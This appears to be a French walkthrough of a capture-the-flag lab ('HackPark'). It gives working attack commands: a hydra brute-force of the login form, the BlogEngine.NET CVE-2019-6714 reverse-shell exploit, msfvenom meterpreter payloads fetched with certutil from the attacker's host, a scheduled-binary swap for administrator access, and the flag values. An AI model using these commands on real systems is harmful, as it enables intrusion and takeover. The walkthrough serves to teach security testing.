# Task 1 

Commencer par scanner les ports disponibles avec un nmap

``` nmap -sS -sV -Pn [IP_MACHINE] ```
 
**PORT     STATE SERVICE**
**80/tcp   open  http**
**3389/tcp open  ms-wbt-server**

## Whats the name of the clown displayed on the homepage?

Télécharger l'image 
Faire une recherche google Lens 

**pennywise**

# Task 2
## What request type is the Windows website login form using?

Faire un click droit sur l'élement "Save Comment"
Aller sur le petit encart "Event" et regarder la méthode d'envoi 

ou 

Regarder l'URL 

**POST**

## Guess a username, choose a password wordlist and gain credentials to a user account!

```hydra -l <username> -P /usr/share/wordlists/<wordlist> [IP_MACHINE] http-post-form ```

Dans un premier temps, faire un premier essai avec aun username et mdp bidon "admin:admin" pour avoir un champ "Login failed", ensuite aller inspecter la requête :

Sur Firefox : 

Clic droit > Inspect > Network > Reload > [Selectionner la requête POST] > Request > Raw > Select All > Copier 

Remplacer les valeurs "username" et "password" par ^USER^ & ^PASS^ 

Ce qui donne la commande : 

``` hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.12.103 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:**VIEWSTATE=IL%2Fw%2BMLR5jEVI0yJkC%2BYgcY4FTz8AUiWho9zztyLZvCK38j8JdiBB3P0PIgGoYwKgtcjaRuRt5esdx3TKFKE7Rjd3PTIslqODQy7kgpD0yB6z4tQwNh%2FwXjJ5USFcRAkTYY5u4oAtzlaO6osFJAIZgtomK%2BjBWyHSUFAIX4lkO9NVPaQQtm%2FFVNDMLeJIua5XSXvqClwl8u8Fz5eW%2FlCSgnrW1ruj2qNPUuIDdZxFgguE3MNrAt1c3R19YDxzDOCv0tDX1Pygytakpsm61HW4QBuL0TgVYtZj28O4sCxw7xOLbnhzqclaFUFXYCTq4Ypi98gXotUFkM9xo6hZ8e9v6pAdbUAfNCUvSEaUtqooVCFO2M1&**EVENTVALIDATION=2ybWsbTEu6xcRITPtJw%2Bx9iETJ40YkYhtLy8NgsEDvpUllAR699UdRX0LmwYwzbTLpx18XTuQofMWxiGVtQJKDyhRtPVk%2FxqnLrG68XcXO6MtO4ucNeUI4P7%2BKm6KKluCE6fA7qJ1gmVdboaYXgO%2BZor6XltI4PNYJbGcXQgI7aghExT&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" ```
 
**[80][http-post-form] host: 10.10.12.103   login: admin   password: 1qaz2wsx**

# Task 3
## Now you have logged into the website, are you able to identify the version of the BlogEngine?

Menu Gauche > About 

**Version: 3.3.6.0**

## Whats is the CVE 

Aller sur Exploit DB > Chercher " BlogEngine.NET 3.3.6 " > Regarder celle l'exploit vérifié > "BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution "

**CVE-2019-6714**

## Who is the webserver running as?

Télécharger l'exploit 

Modifier la ligne 51 pour y rajouter notre IP 
``` using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("[IP_VPN]", 4445)) { ```

Changer l'extension par ``` .acsx ```

Lancer un listener sur le port 4445
``` nc -lvnp 4445 ```

Aller sur la page pour éditer le post déjà présent

Ajouter l'exploit  au file manager 

NE PAS FERMER LA FENÊTRE 

Une fois que l'exploit est chargé, se rendre sur la page suivante : 

[IP_MACHINE]/?theme=../../App_Data/files

Une erreur devraît apparaitre et un shell devrait être lancé sur le listener. 

Lancer la commande : 

``` 
whoami 

c:\windows\system32\inetsrv>whoami                                                                                  

iis apppool\blog 

```
**iis apppool\blog**

NE PAS QUITTER LE TERMINAL 

# Task 4 

## What is the OS version of this windows machine?
Se rendre sur le dossier C:\Windows\Temp
``` cd C:\Windows\Temp ```

Charger un revershell qui sera executé sur la machine distante 

``` msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.94.166 LPORT=4445 -f exe -o shell.exe ```

Lancer un serveur python
``` python3 -m http.server ```

Lancer Mestasploit et générer un méterpreter 

``` 
msfconsole 	 
use exploit/multi/handling 
set lhost 10.18.94.166
set lport 4445
set payload windows/meterpreter/reverse_tcp 
run 
```
Télécharger le fichier sur la machine cible 

``` certutil.exe -urlcache -f http://10.18.94.166:8000/shell.exe shell.exe  ```

Une fois le fichier télécharger, il faut l'executer :
``` shell.exe ```

Le meterpreter doit être en place maintenant.

Récupérer les informations de l'ordianteur : 
```sysinfo

Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```
**OS              : Windows 2012 R2 (6.3 Build 9600).**

## What is the name of the abnormal service running?

Utiliser la commande pour voir tous les services en cours :  ``` ps ```

On peut voir que le service de tâche répétées est activé Wscheduler 

**WindowsScheduler**

## What is the name of the binary you're supposed to exploit? 

ouvrir un shell dans le meterpreter avec la commande 
``` shell```

Se rendre dans le fichier C:\Program Files (x86)\SystemScheduler\Events
``` cd C:\Program Files (x86)\SystemScheduler\Events```

Afficher le contenu du fichier de log.txt "20198415519.INI_LOG.txt"
``` type 20198415519.INI_LOG.txt ```

On peut voir que le fichier Message.exe est tout le temps executer par l'administrateur via le Scheduler donc le binaire supposé à exploité est celui ci : 
**Message.exe**

## What is the user flag (on Jeffs Desktop)?

Créer un revershell avec le nom suivant "Message.txt"
``` msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.94.166 LPORT=1234 -f exe -o Message.exe ```

Revenir un dossier en arrière : 
``` cd ..```

Modifier le nom du fichier principal concerné 
```MOVE Message.exe Message.old ```

Télécharger le fichier sur la machine distante à l'ide d'un powershell
``` certutil.exe -urlcache -f http://10.18.94.166:8000/Message.exe Message.exe  ```

Lancer un listener sur le port 1234 | Lancer un meterpreter sur le port 1234
``` nc -lvnp 1234```
``` msfconsole user multi/handler set payload windows/meterpreter/reverse_tcp set lport 1234 ```
Attendre que la tâche se déclenche et que le revershell se lance | Redémarer le processus manuellement

Regarder qui on est  
```
getuid
Server username: HACKPARK\Administrator

```
Se rendre sur le bureau de l'utilisateur jeff 

``` 
cd C:\Users\jeff\Desktop
type user.txt

759bd8af507517bcfaede78a21a73e39
```
**759bd8af507517bcfaede78a21a73e39**

## What is the root flag?

Se rendre sur le bureau de l'utilisateur Administrator

``` 
cd C:\Users\Administrator\Desktop
type root.txt

7e13d97f05f7ceb9881a3eb3d78d3e72
```
**7e13d97f05f7ceb9881a3eb3d78d3e72**

# Task 5

## ~~Using winPeas~~, what was the Original Install time? (This is date and time) 


Aller sur le shell / meterpreter ou on est**admin**

Lancer la commande pour trouver la date 
```
systeminfo | findstr /i date 

8/3/2019, 10:43:23 AM
```
**8/3/2019, 10:43:23 AM**
